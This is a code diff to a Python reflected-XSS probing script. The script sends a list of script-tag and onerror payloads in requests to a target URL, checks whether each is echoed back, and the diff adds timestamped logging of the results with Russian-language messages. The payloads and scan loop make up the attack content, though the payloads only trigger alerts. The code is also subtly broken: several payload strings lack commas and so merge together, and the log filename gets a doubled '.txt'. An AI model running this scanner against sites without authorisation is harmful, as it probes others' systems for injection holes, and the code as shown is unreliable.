@@ -1,5 +1,8 @@
 import requests
+import datetime
 import urllib.parse
+
+result = f"xss_result_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.txt"
 
 payloads = [
     "<script>alert('XSS')</script>",
@@ -12,7 +15,6 @@ payloads = [
     "<image src =q onerror=prompt(8)>"
     "<img src =q onerror=prompt(8)>"
     "</scrip</script>t><img src =q onerror=prompt(8)>"
-    
 ]
 
 headers = {
@@ -32,7 +34,11 @@ for payload in payloads:
         response = requests.get(test_url, headers=headers)
         if payload in response.text:
             print(f"Сработал {payload}")
+            with open(f"{result}.txt", "a") as f:
+                f.write(f"сработал {payload}\n")
         else:
             print(f"не сработал {payload}")
+            with open(f"{result}.txt", "a") as f:
+                f.write(f"не сработал {payload}\n")
     except Exception as e:
         print(f"ошибка {e}")
